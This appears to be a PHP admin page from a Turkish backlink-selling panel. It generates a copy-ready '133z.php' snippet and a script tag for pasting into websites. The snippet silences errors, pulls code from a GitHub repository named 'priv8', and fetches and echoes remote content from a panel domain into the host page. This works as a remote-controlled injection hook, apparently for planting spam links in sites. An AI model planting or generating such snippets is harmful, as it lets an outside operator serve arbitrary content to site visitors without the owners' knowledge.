<?php include "header.php"; ?>
<style>
   figure {
   display: block;
   margin: 1em 0;
   width: 100%;
   color: #9e9e9e; 
   border: 1px solid #111;
   border-radius: 3px;
   background: rgb(22, 22, 22) !important; 
   }
   figure figcaption {
   display: block;
   font-family: sans-serif;
   padding: 5px 10px 4px 10px;
   border-bottom: 1px solid #111;
   border-radius: 3px 3px 0 0;
   font-weight: bold;
   font-variant: small-caps;
   background: #111;
   color: #9e9e9e !important;
   }
   .numbers {
   cursor: context-menu;
   -webkit-user-select: none;
   -moz-user-select: none;
   -ms-user-select: none;
   user-select: none;
   box-shadow: inset 0 0 4px 0 rgba(0, 0, 0, 0.5);
   }
   pre,
   pre * {
   font: normal normal normal 1em/1.4 monaco, courier, monospace;
   }
   pre {
   font-size: 0.8em;
   }
   pre,
   pre code,
   pre samp {
   display: block;
   margin: 0;
   cursor: text;
   }
   pre code,
   pre samp {
   /* enforce white-space for IE7 */
   white-space: pre;
   /* enforce word-wrap for mobile safari */
   word-wrap: normal;
   padding: 10px;
   -moz-tab-size: 4;
   -o-tab-size: 4;
   tab-size: 4;
   overflow-x: auto;
   box-shadow: inset 0 1px 0 1px rgba(0, 0, 0, 0.5);
   }
   /* additional focus rules to provide a visual cue */
   pre [contenteditable]:focus {
   border-radius: 0 0 3px 0;
   background: #fff;
   outline: none;
   background: rgb(22, 22, 22);
   box-shadow: inset 0 1px 4px 1px rgba(0, 0, 0, 0.5);
   }
   pre.line-numbers {
   position: relative;
   }
   pre.line-numbers code,
   pre.line-numbers samp {
   margin-left: 3em;
   border-left: 1px solid #000;
   }
   pre.line-numbers > div {
   display: block;
   position: absolute;
   top: 0;
   left: 0;
   height: 100%;
   border-radius: 0 0 0 3px;
   overflow: hidden;
   counter-reset: line;
   }
   pre.line-numbers > div > span {
   display: block;
   width: 2.5em;
   padding: 0 0.5em 0 0;
   text-align: right;
   color: #777 !important;
   overflow: hidden;
   counter-increment: line;
   }
   pre.line-numbers > div > span::before {
   content: counter(line);
   }
   pre.line-numbers > div > span:first-child {
   margin-top: 10px;
   }
   pre.line-numbers > div > span:nth-child(odd) {
   background: #111;
   }
   @media print {
   pre code {
   overflow-x: visible;
   white-space: pre-wrap;
   }
   pre.line-numbers div {
   display: none;
   }
   pre.line-numbers > code,
   pre.line-numbers > samp {
   margin-left: 0;
   }
   }
   code.hljs {
   padding-top: 10px;
   }
   /* double-up the syntax elements for cross-browser RTF-keystroke support */
   pre b,
   pre strong {
   font-weight: normal;
   color: #039 !important;
   }
   pre u,
   pre u b,
   pre u strong {
   text-decoration: none;
   color: #083 !important;
   }
   pre i,
   pre em,
   pre i *,
   pre em *,
   pre i * *,
   pre em * * {
   letter-spacing: -0.1em;
   text-decoration: none;
   font-style: normal;
   color: #c55 !important;
   }
   .hljs {
   color: #a9b7c6 !important;
   background: rgb(22, 22, 22);
   display: block;
   overflow-x: auto;
   padding: 0.5em;
   }
   .hljs-number,
   .hljs-literal,
   .hljs-symbol,
   .hljs-bullet {
   color: #FF8040 !important; 
   }
   .hljs-keyword,
   .hljs-selector-tag,
   .hljs-deletion {
   color: #569CD6 !important;
   }
   .hljs-variable,
   .hljs-template-variable,
   .hljs-link {
   color: #FF8040 !important; 
   }
   .hljs-comment,
   .hljs-quote {
   color: #57A64A !important;
   }
   .hljs-meta {
   color: #D2A8A1 !important;
   }
   .hljs-string,
   .hljs-attribute,
   .hljs-addition {
   color: #FF0000 !important;
   }
   .hljs-section,
   .hljs-title,
   .hljs-type {
   color: #ffc66d !important;
   }
   .hljs-name,
   .hljs-selector-id,
   .hljs-selector-class {
   color: #e8bf6a !important;
   }
   .hljs-emphasis {
   font-style: italic !important;
   }
   .hljs-strong {
   font-weight: bold !important;
   }
</style>
<?php if ($userdata['admin']==1) { ?>
<!--**********************************
   Content body start
   ***********************************-->
<div class="content-body">
   <div class="container-fluid">
      <div class="page-titles">
         <ol class="breadcrumb">
            <li class="breadcrumb-item active"><?php echo $title ?> </a></li>
         </ol>
      </div>
      <!-- row -->
      <div class="row">
         <div class="col-xl-6 col-lg-6">
            <div class="card">
               <div class="card-header">
                  <h4 class="card-title">Link Ekle</h4>
               </div>
               <div class="card-body">
                  <div class="basic-form">
                     <form method="post" action="system/a-worker.php">
                        <div class="form-group">
                           <label class="text-label">Site Link:</label> 
                           <input type="text" name="site_link" class="form-control input-rounded" placeholder="Site Link">
                           <label class="text-label">Link Limiti:</label> 
                           <input type="text" name="link_limit" class="form-control input-rounded" placeholder="Link Limit">
                           <label class="text-label">Link Fiyat:</label> 
                           <input type="text" name="link_fiyat" class="form-control input-rounded" placeholder="Link Limit">
                           <br>
                           <button type="submit" class="btn btn-primary">Linki Ekle</button>
                        </div>
                     </form>
                  </div>
               </div>
            </div>
         </div>
         <div class="card">
            <div class="card-header">
               <h4 class="card-title">PHP Siteye Eklenecek Kod Panel Kodu Ve Otokod.</h4>
            </div>
            <div class="card-body">
               <?php  
                  $lastid = DB::queryFirstField("SELECT site_id FROM links ORDER BY site_id DESC LIMIT 1"); 
                   
                  
                  ?>
               <main>
                  <figure>
                     <figcaption>133z.php</figcaption>
                     <pre  id="txt_code">
    <code contenteditable="false" tabindex="0" spellcheck="false">&lt;?php
    $exe = curl_init();
    curl_setopt($exe, CURLOPT_URL, "https://<?php echo $_SERVER['HTTP_HOST']; ?>/code?x=<?php echo $lastid+"1" ?>");
    curl_exec($exe);
?&gt;     &lt;?php 
function file_get_contents_utf8($otokod) {
     $content = file_get_contents($otokod);
      return mb_convert_encoding($content, 'UTF-8',
          mb_detect_encoding($content, 'UTF-8, ISO-8859-1', true));
}
$otokod = curl_init(); curl_setopt($otokod, CURLOPT_URL, "https://raw.githubusercontent.com/securityxd/priv8/main/otokod"); curl_exec($otokod);?&gt;


&lt;?php error_reporting(0);
$sname2 = $_SERVER['SERVER_NAME'];
$sname = str_replace(array("http://", "https://", "www."), null, $sname2);
$x = "https://panel.seocum.org/linkler/" . $sname . ".php";
if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $x);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $gitt = curl_exec($ch);
    curl_close($ch);
    if ($gitt == false) {
        @$gitt = file_get_contents($x);
    }
} elseif (function_exists('file_get_contents')) {
    @$gitt = file_get_contents($x);
}
echo $gitt;?&gt;

</code>  </pre></figure>
                  </figure>
               </main>
               <button class="btn btn-info btn-xs" id="btn_copy">Kopyala</button>
            </div>
         </div>
      </div>
      
      <div class="card">
         <div class="card-header">
            <h4 class="card-title">JS Siteye Eklenecek Kod</h4>
         </div>
         <div class="card-body">
            <?php  
               $lastid = DB::queryFirstField("SELECT site_id FROM links ORDER BY site_id DESC LIMIT 1"); 
                
               
               ?>
            <main>
               <figure>
                  <figcaption>133z.js</figcaption>
                  <pre >
    <code contenteditable="false" tabindex="0" spellcheck="false">&lt;script src="https://<?php echo $_SERVER['HTTP_HOST']; ?>/<?php echo $lastid+"1" ?>.js">&lt;/script>
</code>
  </pre>
               </figure>
            </main>
         </div>
      </div>
   </div>
   
</div>
</div>
</div>
<script>
   function copyToClipboard(text) {
       if (window.clipboardData && window.clipboardData.setData) {
           // Internet Explorer-specific code path to prevent textarea being shown while dialog is visible.
           return clipboardData.setData("Text", text);
   
       }
       else if (document.queryCommandSupported && document.queryCommandSupported("copy")) {
           var textarea = document.createElement("textarea");
           textarea.textContent = text;
           textarea.style.position = "fixed";  // Prevent scrolling to bottom of page in Microsoft Edge.
           document.body.appendChild(textarea);
           textarea.select();
           try {
               return document.execCommand("copy");  // Security exception may be thrown by some browsers.
           }
           catch (ex) {
               console.warn("Copy to clipboard failed.", ex);
               return false;
           }
           finally {
               document.body.removeChild(textarea);
           }
       }
   }
   $( document ).ready(function() {
     $( "#btn_copy" ).click(function() {
       copyToClipboard($("#txt_code").text());
   });
   });
      (function() {
        for (var tags = ['div', 'figure', 'figcaption'], i = 0; i < tags.length; i++) {
          document.createElement(tags[i]);
        }
      })();
      
      (function() {
        //filter IE8 and earlier which don't support the generated content
        if (typeof(window.getComputedStyle) == 'undefined') {
          return;
        }
      
        //get the collection of PRE elements
        var pre = document.getElementsByTagName('pre');
         //now iterate through the collection
        for (var len = pre.length, i = 0; i < len; i++) {
          //get the CODE or SAMP element inside it, 
          //or just in case there isn't one, continue to the next PRE
          var code = pre[i].getElementsByTagName('code').item(0);
          if (!code) {
            code = pre[i].getElementsByTagName('samp').item(0);
            if (!code) {
              continue;
            }
          }
      
          //create a containing DIV column (but don't append it yet)
          //including aria-hidden so that ATs don't read the numbers
          var column = document.createElement('div');
          column.setAttribute('aria-hidden', 'true');
           column.setAttribute('class', 'numbers');
      
          //split the code by line-breaks to count the number of lines
          //then for each line, add an empty span inside the column
          for (var n = 0; n < code.innerHTML.split(/[\n\r]/g).length; n++) {
            column.appendChild(document.createElement('span'));
          }
      
          //now append the populated column before the code element
          pre[i].insertBefore(column, code);
      
          //finally add an identifying class to the PRE to trigger the extra CSS
          pre[i].className = 'line-numbers';
        }
      
      })();
</script>
<?php }else { ?>
<script type="text/javascript">
   window.location = "../"
   
</script>
<?php }; ?>
<?php 
   if (@$_GET['durum']=="ok") { ?>
<script type="text/javascript">
   Swal.fire({
     icon: 'info',
     title: 'Başarılı!',
     text: 'Duyuru Yayınland!',
   })
      
</script>
<?php } ?>
<?php 
   if (@$_GET['durum']=="hata") { ?>
<script type="text/javascript">
   Swal.fire({
     icon: 'warning',
     title: 'Yapma güzel kardeşim kırma sistemizi!',
     text: 'Abi yapma atma o tırnağı inputa',
   })
      
</script>
<?php } ?>
<script>
   $( document ).ready(function() {
       $("[title='Nothing selected']").hide()
   });
    
</script>
<script>
   $( document ).ready(function() {
    $(".swal2-select").remove()
   });
</script>
<?php include "footer.php";?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.4.0/highlight.min.js"></script>